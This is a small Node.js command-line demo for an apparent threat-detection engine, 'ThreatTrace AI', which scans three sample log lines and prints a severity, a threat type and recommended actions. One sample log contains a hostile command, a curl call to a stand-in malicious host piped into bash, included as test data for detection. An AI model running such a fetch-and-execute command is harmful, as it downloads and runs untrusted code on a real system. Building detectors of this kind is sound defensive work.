#!/usr/bin/env node
import { ThreatTraceAI } from "../index.js";

function runCli() {
  console.log("🛡️  ThreatTrace AI Engine v0.1.0 Initializing...\n");
  const engine = new ThreatTraceAI();

  const sampleLogs = [
    "2026-08-29 23:15:00 [INFO] User login successful for admin from 192.168.1.50",
    "2026-08-29 23:16:12 [WARN] Failed password attempt for invalid user root from 45.33.21.10",
    "2026-08-29 23:17:45 [CRITICAL] Command execution detected: curl http://malicious.site/payload.sh | bash from 10.0.0.12"
  ];

  console.log("--- Scanning Sample Threat Logs ---");
  for (const log of sampleLogs) {
    const result = engine.processLog(log);
    console.log(`\nLog Entry: "${log}"`);
    console.log(`Severity: [${result.severity}] (Score: ${result.score}/100)`);
    console.log(`Threat Type: ${result.threatType}`);
    console.log(`Summary: ${result.summary}`);
    console.log(`Recommended Actions:\n - ${result.recommendedActions.join("\n - ")}`);
  }
}

runCli();
